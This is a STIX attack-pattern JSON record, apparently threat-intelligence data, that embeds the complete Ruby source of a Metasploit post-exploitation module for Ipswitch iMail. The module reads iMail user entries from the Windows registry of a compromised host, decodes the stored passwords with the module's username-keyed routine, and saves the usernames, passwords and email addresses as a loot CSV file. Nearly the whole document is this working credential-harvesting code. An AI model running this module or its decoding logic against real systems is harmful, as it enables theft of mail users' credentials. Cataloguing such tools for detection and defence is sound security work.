{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a0ea2c52-4201-49cc-8873-dd8ad8b25c99",
    "created": "2024-08-14T16:33:11.446945Z",
    "modified": "2024-08-14T16:33:11.446949Z",
    "name": "Windows Gather IPSwitch iMail User Data Enumeration",
    "description": " This module will collect iMail user data such as the username, domain full name, e-mail, and the decoded password.  Please note if IMAILUSER is specified, the module extracts user data from all the domains found.  If IMAILDOMAIN is specified, then it will extract all user data under that particular category.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/imail.rb",
            "external_id": "imail.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather IPSwitch iMail User Data Enumeration',\n        'Description' => %q{\n          This module will collect iMail user data such as the username, domain,\n          full name, e-mail, and the decoded password.  Please note if IMAILUSER is\n          specified, the module extracts user data from all the domains found.  If\n          IMAILDOMAIN is specified, then it will extract all user data under that\n          particular category.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'sinn3r', # Metasploit\n        ],\n        'References' => [\n          ['EDB', '11331'],\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ]\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('IMAILUSER', [false, 'iMail username', '']),\n        OptString.new('IMAILDOMAIN', [false, 'iMail Domain', ''])\n      ]\n    )\n  end\n\n  def download_info(imail_user = '', imail_domain = '')\n    base = 'HKLM\\\\SOFTWARE\\\\Ipswitch\\\\IMail'\n\n    # Find domain(s)\n    users_subkey = []\n    if imail_domain.empty?\n      domains_key = registry_enumkeys(\"#{base}\\\\domains\")\n      if !domains_key.nil?\n        domains_key.each do |domain_key|\n          users_subkey << \"#{base}\\\\domains\\\\#{domain_key}\\\\Users\"\n        end\n      end\n    else\n      users_subkey << \"#{base}\\\\domains\\\\#{imail_domain}\\\\Users\"\n    end\n\n    # Find users\n    users_key = []\n    users_subkey.each do |user_key|\n      if imail_user.empty?\n        users = registry_enumkeys(user_key)\n        if !users.nil?\n          users.each do |user|\n            users_key << \"#{user_key}\\\\#{user}\"\n          end\n        end\n      else\n        users_key << \"#{user_key}\\\\#{imail_user}\"\n      end\n    end\n\n    # Get data for each user\n    users = []\n    users_key.each do |key|\n      # Filter out '_aliases'\n      next if key =~ /_aliases/\n\n      vprint_status(\"Grabbing key: #{key}\")\n\n      domain = ::Regexp.last_match(1) if key =~ /Ipswitch\\\\IMail\\\\domains\\\\(.+)\\\\Users/\n      mail_addr = registry_getvaldata(key, 'MailAddr')\n      password = registry_getvaldata(key, 'Password')\n      full_name = registry_getvaldata(key, 'FullName')\n      username = ::Regexp.last_match(1) if mail_addr =~ /(.+)@.+/\n\n      # Hmm, I don't think this user exists, skip to the next one\n      next if mail_addr.nil?\n\n      current_user =\n        {\n          domain: domain,\n          fullname: full_name,\n          username: username,\n          email: mail_addr,\n          password: password\n        }\n\n      users << current_user\n    end\n\n    return users\n  end\n\n  def decode_password(username = '', enc_password = '')\n    # No point trying to decode if there's no username or password\n    return '' if username.empty? || enc_password.empty?\n\n    counter = 0\n    password = ''\n\n    # Start decoding, what's up gold $$\n    0.step(enc_password.length - 1, 2) do |i|\n      byte_1 = enc_password[i, 1].unpack('C')[0]\n      byte_1 = (byte_1 <= 57) ? byte_1 - 48 : byte_1 - 55\n      byte_1 *= 16\n\n      byte_2 = enc_password[i + 1, 1].unpack('C')[0]\n      byte_2 = (byte_2 <= 57) ? byte_2 - 48 : byte_2 - 55\n\n      char = byte_1 + byte_2\n\n      counter = 0 if username.length <= counter\n\n      username_byte = username[counter, 1].unpack('C')[0]\n      if (username_byte > 54) && (username_byte < 90)\n        username_byte += 32\n      end\n\n      char -= username_byte\n      counter += 1\n      password << char.chr\n    end\n\n    vprint_status(\"Password '#{enc_password}' = #{password}\")\n\n    return password\n  end\n\n  def report(users)\n    credentials = Rex::Text::Table.new(\n      'Header' => 'Ipswitch iMail User Credentials',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'User',\n        'Password',\n        'Domain',\n        'Full Name',\n        'E-mail'\n      ]\n    )\n\n    users.each do |user|\n      domain = user[:domain]\n      username = user[:username]\n      password = user[:password]\n      full_name = user[:fullname]\n      e_mail = user[:email]\n\n      if datastore['VERBOSE']\n        text = ''\n        text << \"User=#{username}, \"\n        text << \"Password=#{password}, \"\n        text << \"Domain=#{domain}, \"\n        text << \"Full Name=#{full_name}, \"\n        text << \"E-mail=#{e_mail}\"\n        print_good(text)\n      end\n\n      credentials << [username, password, domain, full_name, e_mail]\n    end\n\n    print_status('Storing data...')\n\n    path = store_loot(\n      'imail.user.creds',\n      'text/csv',\n      session,\n      credentials.to_csv,\n      'imail_user_creds.csv',\n      'Ipswitch iMail user credentials'\n    )\n\n    print_status(\"User credentials saved in: #{path}\")\n  end\n\n  def run\n    imail_user = datastore['IMAILUSER']\n    imail_domain = datastore['IMAILDOMAIN']\n\n    vprint_status('Download iMail user information...')\n\n    # Download user data.  If no user specified, we dump it all.\n    users = download_info(imail_user, imail_domain)\n\n    # Process fullname and decode password\n    users.each do |user|\n      user[:fullname] = Rex::Text.to_ascii(user[:fullname][2, user[:fullname].length])\n      user[:password] = decode_password(user[:username], user[:password])\n    end\n\n    # Report information and store it\n    report(users)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}